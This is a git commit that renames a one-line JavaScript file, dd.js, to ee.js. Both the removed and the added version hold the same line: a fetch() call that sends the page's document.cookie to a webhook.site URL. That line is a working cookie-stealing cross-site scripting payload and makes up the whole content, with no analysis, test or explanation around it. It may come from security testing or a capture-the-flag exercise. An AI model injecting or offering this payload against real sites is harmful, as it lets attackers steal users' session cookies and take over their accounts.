209c85f7d1c38e012d86ed9e8d7a2d09f2cff1ef
tao0845 <138636636+tao0845@users.noreply.github.com>
2024-10-28 16:17:12 +0800

    Update and rename dd.js to ee.js

--- dd.js
+++
@@ -1,1 +0,0 @@
-fetch("https://webhook.site/2c7d018f-1668-4530-aab3-5dba3a13e15d?aaa="+document.cookie);
---
+++ ee.js
@@ -0,0 +1,1 @@
+fetch('https://webhook.site/2c7d018f-1668-4530-aab3-5dba3a13e15d?aaa='+document.cookie)
